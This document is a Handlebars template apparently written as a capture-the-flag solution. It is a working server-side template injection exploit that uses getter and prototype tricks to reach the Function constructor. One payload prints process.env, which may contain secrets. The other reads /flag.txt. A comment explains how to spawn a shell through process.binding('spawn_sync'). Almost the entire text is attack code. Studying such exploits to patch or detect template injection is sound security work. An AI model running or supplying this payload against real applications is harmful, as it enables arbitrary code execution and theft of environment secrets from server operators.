{{! js payload. you can spawn a shell by calling process.binding("spawn_sync") with the correct arguments to bypass not having access to require }}
{{#with "console.log(JSON.stringify(process.env,null, 2))" }}
	{{#with (split "ðŸ’©" 1) as |payload|}}
	{{! set this['undefined'] = this.valueOf }}
	{{__defineGetter__ "undefined" valueOf }}
		{{! sets context to valueOf, this is what we'll be calling bind on later }}
		{{! handlebars ends up calling context.__lookupGetter__() which returns the same thing as __lookupGetter("undefined") }}
		{{#with __lookupGetter__ }}
			{{! override propertyIsEnumerable with a function that always returns 1 using valueOf.bind(1).bind() }}
			{{__defineGetter__ "propertyIsEnumerable" (this.bind (this.bind 1)) }}
			{{! set the context = Function.prototype.constructor }}
			{{__defineGetter__ "undefined" this.constructor}}
			{{#with __lookupGetter__ as |ctor| }}
				{{! setup a getter that will execute our payload }}
				{{__defineGetter__ "hax" (ctor.apply ctor payload)}}
				{{{hax}}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}


{{#with "throw JSON.stringify(process.mainModule.require('/flag.txt'), null, 2);" }}
	{{#with (split "ðŸ’©" 1) as |payload|}}
		{{__defineGetter__ "undefined" valueOf }}
		{{#with __lookupGetter__ }}
			{{__defineGetter__ "propertyIsEnumerable" (this.bind (this.bind 1)) }}
			{{__defineGetter__ "undefined" this.constructor}}
			{{#with __lookupGetter__ as |ctor| }}
				{{__defineGetter__ "hax" (ctor.apply ctor payload)}}
				{{{hax}}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
